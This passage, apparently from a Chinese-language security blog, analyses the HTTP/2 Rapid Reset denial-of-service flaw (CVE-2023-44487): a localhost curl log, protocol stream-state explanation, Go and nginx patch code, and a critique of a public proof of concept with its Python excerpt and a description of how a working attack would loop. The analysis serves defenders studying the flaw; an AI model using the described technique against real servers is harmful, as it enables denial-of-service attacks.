&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* ALPN: offers h2,http/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (OUT), TLS handshake, Client hello (1):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Server hello (2):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Certificate (11):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, CERT verify (15):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (IN), TLS handshake, Finished (20):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* TLSv1.3 (OUT), TLS handshake, Finished (20):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* ALPN: server accepted h2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* Server certificate:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* start date: Oct 12 08:46:51 2023 GMT
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* expire date: Oct 9 08:46:51 2033 GMT
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* SSL certificate verify result: self-signed certificate (18), continuing anyway.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* using HTTP/2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [:method: GET]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [:path: /]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [:scheme: https]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [:authority: localhost]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [user-agent: curl/7.88.1]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* h2h3 [accept: */*]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">* Using Stream ID: 1 (easy handle 0x55566530a9e0)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt; &lt;/span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">Host: localhost&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">user-agent: curl/7.88.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">accept: */*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt; HTTP/2 200
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>HTTP/2 200
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt; content-type: text/plain; charset=utf-8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content-type: text/plain; charset=utf-8
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt; content-length: 12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>content-length: 12
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt; date: Fri, 13 Oct 2023 06:52:06 GMT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>date: Fri, 13 Oct 2023 06:52:06 GMT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>* Connection #0 to host localhost left intact
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Hello World!#
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="技术分析">技术分析&lt;/h3>
&lt;p>其实这个在我看来某些方面看也不算漏洞，根据
&lt;a href="https://datatracker.ietf.org/doc/html/rfc9113#name-stream-concurrency" target="_blank">RFC9113&lt;/a>规定，在HTTP2 setting阶段服务器可以声明支持的最大并发流，同时规定了客户端或服务端可以随时发送RST_STREAM以取消流，在收到RST_STREAM接收方不能在发送其他数据，除了优先级，协议并未规定客户端发送RST_STREAM的阈值，那么各大语言和软件实现的时候可能限制也有可能不限制RST_STREAM的阈值。这属于是各自实现方式的问题。
从协议层面讲，客户端直接RST_STREAM没有问题，典型的场景是用户在浏览器访问网站期间因为某些原因直接关闭了页面，此时浏览器需要向服务端发送RST_STREAM帧来取消流，可以帮助服务器节省资源。&lt;/p>
&lt;h4 id="http的几种ddos">HTTP的几种DDOS&lt;/h4>
&lt;ul>
&lt;li>HTTP 1.1
在HTTP 1.1中使用单个TCP连接顺序发送请求和响应，在前面的请求被响应之后才可以发送后续的请求，不能被多路复用，此时如果要对其进行DOS的话需要大量机器打开TCP连接顺序发送请求，消耗资源。&lt;/li>
&lt;li>HTTP 2
HTTP2中实现了多路复用和并发，可以异步请求，客户端和服务端通过流ID来识别数据属于哪一个请求，这和HTTP1.1 相比，客户端可以启用大量并行请求，造成服务器负载上升，所以为了防护这种情况，在HTTP2初始化的时候，&lt;code>SETTINGS_MAX_CONCURRENT_STREAMS&lt;/code>允许服务器向客户端通告最大允许的并发流，超过这个限制的流，服务器会返回RST_STREAM来拒绝这个流。HTTP2各个状态可以使用状态机表示，当服务器收到客户端发送的HEADERS帧时，会将流状态从空闲转换为打开，而后转为半关闭状态，&lt;strong>只有流处于打开状态或半关闭状态才会被计入打开的流数量&lt;/strong>。&lt;/li>
&lt;/ul>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/Request-stream-states.png" />&lt;/p>
&lt;p>来源:
&lt;a href="https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/" target="_blank">https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/&lt;/a>&lt;/p>
&lt;p>上面提到，只有打开和半关闭的流才会计入流数量，影响并发限制，当客户端发送RST_STREAM时，流状态会从半关闭状态转入关闭状态，即释放了一个流，此时客户端可以立即发起一个新请求占用释放的流，这就是CVE-2023-44487的关键。恶意客户端可以在打开大量流之后立即发送RST_STREAM帧，这样在请求到达服务器，而服务器暂未准备好响应时，这个请求的RST_STREAM帧随机到达服务器，服务器取消这个流并释放一个并发流。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/2023_worlds_largest_rapid_reset_diagram.max-1616x909.png" />
图片来源：
&lt;a href="https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack" target="_blank">https://cloud.google.com/blog/products/identity-security/how-it-works-the-novel-http2-rapid-reset-ddos-attack&lt;/a>&lt;/p>
&lt;p>在标准HTTP2 DDOS的时候，恶意客户端可以打开服务器允许的最大限制的流数量而后发送请求，服务器依次响应，循环这个过程，消耗服务器资源。
而变种HTTP2 DDOS中，攻击者可以利用CVE-2023-44487 绕过这个限制，滥用HTTP 2的取消请求，快速重置无限数量的流，根据RFC 服务器收到RST_STREAM帧之后不需要返回数据，在现实实现时，服务器收到了客户端的HRADERS请求，在收到RST_STREAM之前，需要解析客户端请求的资源，在收到RST_STREAM之后需要释放资源，所以在客户端只需要付出带宽的代价下，服务器会付出比这个高得多的代价，导致高效率的DDOS。&lt;/p>
&lt;p>&lt;strong>补丁分析&lt;/strong>&lt;/p>
&lt;p>在go中支持HTTP2协议的解析，所以go也受这个漏洞影响，下面是go修复漏洞的补丁diff
对比go修复这个漏洞的补丁，主要修复逻辑在http2#scheduleHandler，其中advMaxStreams默认为250，当在处理的流超过了250，则比较未开始处理的流数量是否大于1000，大于则报错。
可以看出来补丁主要是限制了同时并发流的数量。该方法在processHeaders中调用，可以看出来，在原先逻辑中，会直接处理客户端请求，而在补丁中会判断当前流的数量，在范围内才会调用 &lt;code>go sc.runHandler(rw, req, handler)&lt;/code>处理请求&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/6.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">type&lt;/span> &lt;span style="color:#a6e22e">unstartedHandler&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">streamID&lt;/span> &lt;span style="color:#66d9ef">uint32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rw&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">responseWriter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">handler&lt;/span> &lt;span style="color:#66d9ef">func&lt;/span>(&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">ResponseWriter&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// scheduleHandler starts a handler goroutine,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// or schedules one to start as soon as an existing handler finishes.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">func&lt;/span> (&lt;span style="color:#a6e22e">sc&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">serverConn&lt;/span>) &lt;span style="color:#a6e22e">scheduleHandler&lt;/span>(&lt;span style="color:#a6e22e">streamID&lt;/span> &lt;span style="color:#66d9ef">uint32&lt;/span>, &lt;span style="color:#a6e22e">rw&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">responseWriter&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>, &lt;span style="color:#a6e22e">handler&lt;/span> &lt;span style="color:#66d9ef">func&lt;/span>(&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">ResponseWriter&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">http&lt;/span>.&lt;span style="color:#a6e22e">Request&lt;/span>)) &lt;span style="color:#66d9ef">error&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">serveG&lt;/span>.&lt;span style="color:#a6e22e">check&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">maxHandlers&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">advMaxStreams&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">curHandlers&lt;/span> &amp;lt; &lt;span style="color:#a6e22e">maxHandlers&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">curHandlers&lt;/span>&lt;span style="color:#f92672">++&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">go&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">runHandler&lt;/span>(&lt;span style="color:#a6e22e">rw&lt;/span>, &lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">handler&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(&lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>) &amp;gt; int(&lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">advMaxStreams&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">countError&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;too_many_early_resets&amp;#34;&lt;/span>, &lt;span style="color:#a6e22e">ConnectionError&lt;/span>(&lt;span style="color:#a6e22e">ErrCodeEnhanceYourCalm&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span> = append(&lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>, &lt;span style="color:#a6e22e">unstartedHandler&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">streamID&lt;/span>: &lt;span style="color:#a6e22e">streamID&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rw&lt;/span>: &lt;span style="color:#a6e22e">rw&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">req&lt;/span>: &lt;span style="color:#a6e22e">req&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">handler&lt;/span>: &lt;span style="color:#a6e22e">handler&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> })
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> (&lt;span style="color:#a6e22e">sc&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">serverConn&lt;/span>) &lt;span style="color:#a6e22e">handlerDone&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">serveG&lt;/span>.&lt;span style="color:#a6e22e">check&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">curHandlers&lt;/span>&lt;span style="color:#f92672">--&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">maxHandlers&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">advMaxStreams&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ; &lt;span style="color:#a6e22e">i&lt;/span> &amp;lt; len(&lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>); &lt;span style="color:#a6e22e">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">u&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>[&lt;span style="color:#a6e22e">i&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">streams&lt;/span>[&lt;span style="color:#a6e22e">u&lt;/span>.&lt;span style="color:#a6e22e">streamID&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">nil&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// This stream was reset before its goroutine had a chance to start.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">curHandlers&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#a6e22e">maxHandlers&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">curHandlers&lt;/span>&lt;span style="color:#f92672">++&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">go&lt;/span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">runHandler&lt;/span>(&lt;span style="color:#a6e22e">u&lt;/span>.&lt;span style="color:#a6e22e">rw&lt;/span>, &lt;span style="color:#a6e22e">u&lt;/span>.&lt;span style="color:#a6e22e">req&lt;/span>, &lt;span style="color:#a6e22e">u&lt;/span>.&lt;span style="color:#a6e22e">handler&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>[&lt;span style="color:#a6e22e">i&lt;/span>] = &lt;span style="color:#a6e22e">unstartedHandler&lt;/span>{} &lt;span style="color:#75715e">// don&amp;#39;t retain references
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span> = &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>[&lt;span style="color:#a6e22e">i&lt;/span>:]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(&lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">sc&lt;/span>.&lt;span style="color:#a6e22e">unstartedHandlers&lt;/span> = &lt;span style="color:#66d9ef">nil&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>nginx针对这个漏洞也出了一份
&lt;a href="https://www.nginx.com/blog/http-2-rapid-reset-attack-impacting-f5-nginx-products/" target="_blank">官方通告&lt;/a>指出默认配置不受此漏洞影响，即 keepalive_requests 1000;http2_max_concurrent_streams 128;这个配置也可以对应上go补丁中的250最大stream和1000个队列。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/1.png" />&lt;/p>
&lt;p>虽然默认配置不受该漏洞影响，但nginx也针对这个漏洞进行了修复，commit为
&lt;a href="https://github.com/nginx/nginx/commit/6ceef192e7af1c507826ac38a2d43f08bf265fb9" target="_blank">6ceef192e7af1c507826ac38a2d43f08bf265fb9&lt;/a>，在该commit中也是统计并限制了并发流数量，超过某个阈值则返回错误。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-44487-http2-rapid-reset-ddos-attack.zh-cn.assets/3.png" />&lt;/p>
&lt;p>&lt;strong>开发PoC&lt;/strong>&lt;/p>
&lt;p>在GitHub的
&lt;a href="https://github.com/imabee101/CVE-2023-44487/blob/main/main.py" target="_blank">PoC&lt;/a>经过实际测试，&lt;strong>没有达到谷歌和CF所说的在发HTTP2请求之后立马重置，也就是无效PoC&lt;/strong>。根据代码逻辑，在发送HTTP2 header之后PoC接着尝试接收服务器返回的数据，如果服务端返回了StreamReset则打印已成功取消，如果是RequestReceived则调用conn.reset_stream，&lt;strong>但实际利用应该是发送HTTP2 header之后立马发送RST_Stream，而后打开一个新流重复如上过程&lt;/strong>。
实际测试发现，conn.reset_stream(event.stream_id, error_code=ErrorCodes.CANCEL)永远不会被调用到，也就是该PoC会执行完整的HTTP2请求，完事之后服务端返回RST_STREAM，打印已取消，这明显是错误的。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span> stream_id &lt;span style="color:#f92672">=&lt;/span> conn&lt;span style="color:#f92672">.&lt;/span>get_next_available_stream_id()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">.&lt;/span>send_headers(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> stream_id,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [(&lt;span style="color:#e6db74">&amp;#39;:method&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>), (&lt;span style="color:#e6db74">&amp;#39;:authority&amp;#39;&lt;/span>, url), (&lt;span style="color:#e6db74">&amp;#39;:path&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>), (&lt;span style="color:#e6db74">&amp;#39;:scheme&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;https&amp;#39;&lt;/span>)],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sock&lt;span style="color:#f92672">.&lt;/span>sendall(conn&lt;span style="color:#f92672">.&lt;/span>data_to_send())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Read some data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">=&lt;/span> sock&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">65535&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> data:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> events &lt;span style="color:#f92672">=&lt;/span> conn&lt;span style="color:#f92672">.&lt;/span>receive_data(data)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> event &lt;span style="color:#f92672">in&lt;/span> events:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> isinstance(event, RequestReceived):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Cancel the stream with error code for CANCEL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">.&lt;/span>reset_stream(event&lt;span style="color:#f92672">.&lt;/span>stream_id, error_code&lt;span style="color:#f92672">=&lt;/span>ErrorCodes&lt;span style="color:#f92672">.&lt;/span>CANCEL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> isinstance(event, StreamReset):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Stream &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>event&lt;span style="color:#f92672">.&lt;/span>stream_id&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> cancelled.&amp;#34;&lt;/span>)
